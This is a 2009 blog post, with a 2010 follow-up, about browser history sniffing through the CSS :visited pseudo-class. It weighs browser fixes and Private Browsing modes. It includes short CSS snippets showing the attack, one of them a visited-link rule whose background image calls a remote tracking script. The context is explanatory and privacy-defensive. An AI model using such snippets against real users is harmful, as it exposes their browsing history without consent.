---
layout: post
date: 2009-04
title: startpanic.com and :visited links privacy issue
---

Back in April 2008 I was blogging about <a href="http://sharovatov.wordpress.com/2008/04/06/selectors-api-support-in-ie8b1/">Selectors API support in IE8 Beta 1</a> support and mentioned the security concern about `:visited` links – **potential privacy theft**.

## The problem

This concern was risen long ago in <a href="http://www.w3.org/TR/CSS21/selector.html#link-pseudo-classes">CSS2.1 Spec</a> (and also mentioned then in the following specs - 
<a href="http://www.w3.org/TR/css3-selectors/#link">CSS3 Selectors</a>, <a href="http://www.w3.org/TR/selectors-api/#privacy">Selectors API spec</a>):

> Note. It is possible for style sheet authors to abuse the `:link` and `:visited` pseudo-classes to determine which sites a user has visited without the user's consent.

> UAs may therefore treat all links as unvisited links, or implement other measures to preserve the user's privacy while rendering visited and unvisited links differently.

The <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=57351">original bugzilla issue</a> was reported back in October 2000, <a href="http://crypto.stanford.edu/sameorigin/">Stanford sameorigin whitepapers</a> had this issue described in 2002, then lots of articles followed, and then Ajaxian had an <a href="http://ajaxian.com/archives/spyjax-using-avisited-to-test-your-history">article</a> in 2007 which made this issue really popular.

And now we have <a href="http://startpanic.com">http://startpanic.com</a> with nice implementation of this approach – it has <a href="http://startpanic.com/db/db_en.txt">a txt database</a> of some thousands URLs that are tested for being visited.

You can check <a href="http://startpanic.com/js/sp.js">the code</a> – it’s pretty straight forward – links from the database are appended to the iframe where `:visited` links are displayed and others are hidden, then current style of the current link is checked and if it’s hidden, this link is appended to the big list of visited links.

## Possible solutions
Basically, there’re some ways to resolve this issue:

* try to protect `:visited` links computed style access

* limit support of `:visited`

* don’t fix it, find a way around

### Protect :visited links programmatically
That’s clearly useless. People were suggesting many solutions (which you can get round), like making getComputedStyle return default value for `:visited` links as if they are not visited – but you can make the case more complex, e.g.

	a:link span {display: none;}
	a:visited span { display: block }

and then use getComputedStyle to check the span; and all the proposed solutions were weak in some way. But even if you manage to make scripts unaware about the state of your links, there will always be a server-side attack vector – for those links that you want to check you can just specify a unique background-image pointing to some server-side tracking script, e.g.:

	#alQaedaLnk:visited {
		background: url(http://www.cia.gov/track.pl);
	}

Like <a href="http://ha.ckers.org/weird/CSS-history.cgi">here</a>, for example. So it clearly shows us that there’s no way (or it’s too troublesome) to fix this “issue” programmatically.

### Limiting support for `:visited`

As I understood from the discussion with startpanic.com author, he wants to limit `:visited` support so that only links to pages to the same domain are applied with `:visited` pseudo class.

But this would hurt user experience so much! First example that comes to my head is Google and other search engines – they all colour visited links differently so you can clearly see which pages you’ve already been on and which not. If same-domain policy is applied, all the links in Google search results will be plain blue. This sounds awful to me.

Guys from <a href="http://crypto.stanford.edu/sameorigin/">Stanford security group</a> suggest applying `:visited` only to those links that were visited from the current domain. This approach was used in Firefox add-on called <a href="https://addons.mozilla.org/en/firefox/addon/1502">SafeHistory</a> (it doesn’t work any more). So if you do a search in Google and visit some pages, `:visited` will be applied to these pages only in Google search results. So if you then do a search on MSN Live Search, all the links there will be plain blue and `:visited` won’t be applied to them. To me this solution looks weird as well. And Firefox developers said that it would be a problem to support this; and 

I don’t think other browser vendors will fix this privacy “issue” in that way. Keep on reading, I will explain why.

So from technical prospective the only easy solution would be to completely remove support for `:visited` pseudo class, which nobody will do because user experience will suffer and people will complain.

### Best solution – find a way around
You may think – why not make `:visited` support configurable in the browser UI?  But that’s what all browsers already have! **You can specify that you don’t want to keep history at all, you won’t see visited links anywhere, you will feel that you’re “safe”** :).

### Another solution – Private Browsing mode
Another nice option is to use Private Browsing mode that’s supported by all modern browsers <a href="http://blogs.msdn.com/ie/archive/2008/08/25/ie8-and-privacy.aspx">IE8</a>, <a href="http://www.apple.com/pro/tips/privacy_safari.html">Safari</a>, <a href="http://www.google.com/support/chrome/bin/answer.py?hl=en&amp;answer=95464">Google Chrome</a> (and then <a href="https://wiki.mozilla.org/PrivateBrowsing">FF3.1</a> joined). **When you visit a site that you don’t want to appear in the history – use Private Browsing mode and you’re safe.**

**Note**: currently Google Chrome has a bug – it applies `:visited` pseudo class to
links in Incognito Mode. However, <a href="http://codereview.chromium.org/42114">the bug is fixed</a> and the bugfix will be included in one of new updates.

## “Private Browsing” browser feature is the only true solution to this issue.

Here’s a <u><a href="http://sharovatov.ru/testcases/visitedIssueTest.html">testcase</a></u>. I visited both <a href="http://ya.ru">http://ya.ru</a> and <a href="http://www.google.com">http://www.google.com</a> links in IE8 InPrivate mode, then went to the <a href="http://sharovatov.ru/testcases/visitedIssueTest.html">testcase page</a> and it didn’t tell anything as if I hadn’t visited these URLs.

<img src="http://sharovatov.ru/screenshots/visitedIssueIE8.png">

When I followed the same process in Google Chrome “Incognito mode”, it showed that I visited both ya.ru and Google.com. <a href="http://codereview.chromium.org/42114">This bug is fixed</a> and will be updated in newer versions of Google Chrome.

<img src="http://sharovatov.ru/screenshots/visitedIssueGG.png">

And this issue is also fixed in FF3.1b3:

<img src="http://sharovatov.ru/screenshots/visitedIssueFF.png">

In comments Avdeev said that Safari in its Private Browsing mode (they call it Porn mode) didn’t show if the link was visited or not. Great stuff!

**Update:** It seems that Opera 10 will have Private browsing mode support as well – they are already choosing the name for it – and the most voted one is “Phantom mode” :)

**Note**: while I understand the whole concern about privacy, you shouldn’t forget that all search engines, adds providers and many many others gather statistics about your visits. When you’re in London (and other major cities), you’re being watched on CCTV constantly, does it bother you? Does this new world leave any space for privacy?

**Links**:

* the best use of this privacy issue is <a href="http://www.azarask.in/blog/post/socialhistoryjs/">this</a>.

* <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=147777">This bugzilla entry</a> contains main discussion about the issue.

# :visited links privacy issue revisited *2010-03*
This is a follow up. I thought the best solution for this issue would be educating users about the problem and promoting Private mode as a solution. I think I was wrong. See below why.

It’s worthy to note that all browsers now support Private mode – IE8, Fx, Opera, Safari, Chrome. Opera 10.50 can even open a “private” tab in the existing window. Flash player did a good catch-up – with its version 10.1 release flash cookies are not stored when a browser runs in the Private mode (so updating to latest flash player is highly recommended if you use Private mode).

But browser vendors clearly failed to promote this feature. I asked few general internet users, nobody even knew about Private browsing mode in their browser. (However, most of my interviewees knew about HTTPS, so security concerns weren’t completely new to them). If my small poll doesn’t seem a representative sample for you, do your own and share results!

So people are obviously not aware that their history data can be “obtained” by anyone.

David Baron thought this was unacceptable and <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=147777#c172">started working on a patch for Gecko</a> which targets most of the “attack vectors” (see his <a href="http://dbaron.org/mozilla/visited-privacy">blogpost</a>).

Basically, Gecko will have two style contexts for a visited link – one with rules applied for a `:visited` link, and one with rules not applied – as if the link wasn’t visited. GetComputedStyle will take the first style context, and therefore getComputedStyle check for a CSS value of the rule set for `:visited` pseudoclass selector will fail – it will think the link has default or specified in `:link` selector rules applied. But when browser will do actual styling, it will use the second styling context, but will apply only a set of properties which are considered safe (`color`, `background-color`, `border-*-color`, and `outline-color`). 

This approach looks nice and will give users some protection, but as it was pointed by <a href="http://lists.w3.org/Archives/Public/www-svg/2008Sep/0112.html">Robert O’Callahan here</a>, it will fail if it becomes possible to read the actual color of the link after actual styling is done. So this approach has to be applied very carefully – for example, if Canvas <a href="http://mxr.mozilla.org/mozilla/source/content/canvas/src/nsCanvasRenderingContext2D.cpp#2352">drawWindow object was available not only to Fx extensions</a>, it would mean that attacker would still be able to get resulting color from the second styling context. I really hope this never happens.

So I was wrong because I thought that no browser vendor would go and fix this technically, while it seems quite doable and thanks to David Baron, it will appear in Gecko. With careful integration, this approach will protect from most of the possible attacks and will still provide a way for authors to make visited and not visited links distinguishable in their designs.

We’ll now see what other browser vendors will do, and this will become especially interesting if Firefox does a good marketing campaign from this feature.